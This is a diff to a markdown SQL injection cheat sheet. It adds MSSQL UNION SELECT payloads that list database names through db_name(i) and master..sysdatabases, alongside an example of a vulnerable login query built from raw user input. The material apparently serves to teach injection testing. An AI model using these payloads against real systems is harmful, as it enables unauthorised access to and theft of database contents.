@@ -41,7 +41,10 @@
   _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 ###### Assume no of columns to be 3
 #### Finding version and databases
-*  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --` [Here **i** is the i-th database present]
+*  _[$input_user]_ : `' UNION SELECT 1,@@version,db_name(i) --` [Here **i** is the i-th database present]
+*  _[$input_user]_ : `' UNION SELECT 1,@@version,name FROM master..sysdatabases --`
+
+__[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1,name FROM master..sysdatabases --` won't work , second column MUST be a string. Interesting !!]__
 
 ## For sqlite
  In sqlite __sqlite_master__ replaces __information_schema__
